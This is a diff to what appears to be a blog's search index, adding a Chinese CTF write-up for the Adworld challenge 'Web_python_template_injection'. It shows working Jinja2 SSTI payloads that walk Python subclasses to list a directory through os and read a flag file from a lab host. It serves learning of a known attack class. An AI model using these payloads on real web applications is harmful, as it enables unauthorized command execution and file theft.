@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>攻防世界Web_python_template_injection</title>
+    <link href="/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/"/>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
+    
+    <content type="html"><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p><p><img src="https://s2.loli.net/2023/10/31/HuKl192fCoAkrVe.png"></p><p>进入靶机网址提示</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure><p>知道这是一道python模板注入</p><p>url输入 </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure><p>页面回显</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure><p>判断存在SSTI注入</p><p>查看网站模块，url输入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure><p>回显</p><p><img src="https://s2.loli.net/2023/10/31/juF1CO9pcBKzgNi.png"></p><p>可以在其中找到 <strong>&lt;type ‘file’&gt;类型</strong> (可以进行文件读取)，下标是40(此项前面有40个’,’)</p><p>还可以看到有一个 <strong>&lt;class ‘site._Printer’&gt;类型</strong>（可以进行命令执行），下标是71，构造payload进行命令执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">URL <span class="hljs-link">http://61.147.171.105:50859/</span>[<span class="hljs-string">&#x27;index.py&#x27;, &#x27;fl4g&#x27;</span>] not found<br></code></pre></td></tr></table></figure><p>接下来构造读取flag payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF Writeup</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF,攻防世界</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>计算机网络(第八版)笔记摘录</title>
     <link href="/2023/10/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E5%85%AB%E7%89%88-%E7%AC%94%E8%AE%B0%E6%91%98%E5%BD%95/"/>
     <url>/2023/10/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E5%85%AB%E7%89%88-%E7%AC%94%E8%AE%B0%E6%91%98%E5%BD%95/</url>
